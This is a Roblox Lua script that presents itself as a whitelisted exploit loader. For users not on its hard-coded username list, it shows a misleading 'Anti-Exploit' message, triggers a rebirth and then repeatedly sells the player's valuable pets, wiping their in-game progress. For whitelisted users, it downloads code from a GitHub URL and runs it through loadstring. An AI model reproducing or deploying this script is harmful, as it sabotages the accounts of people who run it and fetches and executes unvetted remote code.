-- ==========================================
-- WHITELIST & CONFIGURATION SYSTEM
-- ==========================================
local WHITELISTED_USERS = {
    "KingBaconMuscle1",
    "DeeV_LorD",
    "AKUNPALSU04",
    "jhojet23",
    "ryanpadri",
    "SOE_GAGI",
    "gamestyep25",
    "bahomp_pre",
    "huhseller09",
    "santos0123078"
}

local function isWhitelisted(player)
    for _, idOrName in ipairs(WHITELISTED_USERS) do
        if type(idOrName) == "number" and player.UserId == idOrName then
            return true
        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- ==========================================
-- KUNG HINDI WHITELISTED: Auto-Rebirth & Auto-Sell AGAD
-- ==========================================
if not isWhitelisted(localPlayer) then
    print("[Anti-Exploit] Unwhitelisted player detected. Executing auto-rebirth and auto-sell...")
    
    -- 1. Auto-Rebirth
    pcall(function()
        ReplicatedStorage.remotes.rebirthRequest:FireServer()
    end)
    
    -- 2. Bagong Background Auto-Sell System (Rarity Folders Support)
    task.spawn(function()
        local autoSellPetsByName = {
            ["Swift Samurai"] = true,
            ["Tribal Overlord"] = true,
            ["Mighty Monster"] = true,
            ["Wild Wizard"] = true,
            ["Omega Overlord"] = true,
            ["Titanium Hydra"] = true,
            ["Powercore Hound"] = true,
            ["Jungle Captain"] = true,
            ["Flaming Hedgehog"] = true,
            ["Electro Bunny"] = true,
            ["Common Boss Pet"] = true,
            ["Rare Boss Pet"] = true,
            ["Epic Boss Pet"] = true,
            ["Legendary Boss Pet"] = true,
            ["Mythic Boss Pet"] = true,
            ["Rainbow Boss Pet"] = true,
            ["Haunted Lantern"] = true,
            ["Candy Cube"] = true,
            ["Cursed Candle"] = true,
            ["Jack o Block"] = true,
            ["Bone Block"] = true,
            ["Coffin Crawler"] = true,
            ["Apex Overlord"] = true,
            ["Shard Dragon"] = true,
            ["Nova Pheonix"] = true,
            ["Infernal Steed"] = true,
            ["Neon Guardian"] = true,
        }

        while true do
            local p = Players.LocalPlayer
            local petsFolder = p:FindFirstChild("petsFolder") or p:FindFirstChild("PetsFolder") or p:FindFirstChild("Pets")
            local rEvents = ReplicatedStorage:FindFirstChild("rEvents") or ReplicatedStorage:FindFirstChild("remotes")
            local sellEvent = rEvents and (rEvents:FindFirstChild("sellPetEvent") or rEvents:FindFirstChild("SellPetEvent") or rEvents:FindFirstChild("sellPet") or rEvents:FindFirstChild("SellPet"))

            if petsFolder and sellEvent then
                for _, rarityFolder in pairs(petsFolder:GetChildren()) do
                    if rarityFolder:IsA("Folder") then
                        for _, pet in pairs(rarityFolder:GetChildren()) do
                            if autoSellPetsByName[pet.Name] then
                                pcall(function()
                                    if sellEvent:IsA("RemoteFunction") then
                                        sellEvent:InvokeServer("sellPet", pet)
                                    else
                                        sellEvent:FireServer("sellPet", pet)
                                    end
                                end)
                                task.wait(0.1)
                            end
                        end
                    elseif rarityFolder:IsA("Model") or (rarityFolder:IsA("BasePart") and autoSellPetsByName[rarityFolder.Name]) then
                        -- Fallback kung sakaling direct pet ang nasa loob ng folder
                        if autoSellPetsByName[rarityFolder.Name] then
                            pcall(function()
                                if sellEvent:IsA("RemoteFunction") then
                                    sellEvent:InvokeServer("sellPet", rarityFolder)
                                else
                                    sellEvent:FireServer("sellPet", rarityFolder)
                                end
                            end)
                            task.wait(0.1)
                        end
                    end
                end
            end
            
            task.wait(1)
        end
    end)
    
    return
end

-- ==========================================
-- KUNG WHITELISTED: I-execute ang Script
-- ==========================================
print("[Whitelist System] Player is whitelisted. Loading script...")

local success, errorMessage = pcall(function()
    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Script-ZenthonLee/MBA-Test/refs/heads/main/MuscleBeachArena")
    local compiledScript, loadError = loadstring(scriptContent)
    
    if loadError then
        warn("[Loadstring Error]: " .. tostring(loadError))
        return
    end
    
    compiledScript()
end)

if not success then
    warn("[Execution Failed]: " .. tostring(errorMessage))
end
